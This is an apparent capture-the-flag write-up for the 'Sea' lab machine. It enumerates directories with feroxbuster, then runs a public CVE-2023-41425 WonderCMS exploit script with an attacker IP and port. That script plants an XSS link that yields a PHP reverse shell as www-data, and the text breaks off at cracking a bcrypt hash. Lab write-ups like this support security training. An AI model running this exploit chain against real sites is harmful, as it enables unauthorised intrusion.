Googling the version of ssh we can see what we are up against.

`Ubuntu focal`

![Image](../assets/img/post/sea/image.png)

Web: The first impression is we have a register page `contact` in `PHP`.

![Image](../assets/img/post/sea/image-1.png)

![Image](../assets/img/post/sea/image-2.png)

#### Resolution DNS

Add sea.htb to hosts.

![Image](../assets/img/post/sea/image-3.png)

The first thing what i was do is if web is created with some CMS or some technology vulnerability, but there nothing, so we go to run a scan directory and see what we have.

![Image](../assets/img/post/sea/image-4.png)

What i know for now is  i can upload any link in the section website.

![Image](../assets/img/post/sea/image-5.png)

## Scan Directory

After scan directory with dirsearch, I got some directories but they dont say anything if theres some vulnerability, so we gonna use feroxbuster and some directory lists and see what i get with it

```bash
feroxbuster -u http://sea.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Image](../assets/img/post/sea/image-6.png)

I see file in `/themes/bike/` (LICENSE with status 200) we will try to FUZZ that section and we see if i found another files.

```bash
feroxbuster -u http://sea.htb/themes/bike/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,md
```

![Image](../assets/img/post/sea/image-7.png)

### Vulnerability

Theme.php, version, README.md, LICENSE files

![Image](../assets/img/post/sea/image-8.png)

Now we have a vulnerability.

#### CVE-2023-41425

https://github.com/prodigiousMind/CVE-2023-41425?source=post_page-----7ebffbff37d2--------------------------------

![Image](../assets/img/post/sea/image-9.png)

Follow the instructions of repository.

```python
python3 exploit.py http://sea.htb/wondercms/loginURL 10.10.11.28 9001
```

![Image](../assets/img/post/sea/image-10.png)

The script make us a file "xss.js" and we need to send the link in the section website of form. Once send the form make us a file in the path /themes/revshell-main/rev.php that need execute for got the reverse shell.

![Image](../assets/img/post/sea/image-11.png)

This the path what need to execute but we need to add the ip and port of attacker machine.

![Image](../assets/img/post/sea/image-12.png)

### Shell as www-data

Attacker machine:

![Image](../assets/img/post/sea/image-15.png)

We found the path of database with a password.

![Image](../assets/img/post/sea/image-16.png)

### Hashcat

Hash bcrypt

Before we need to remove the scape slash `\`.
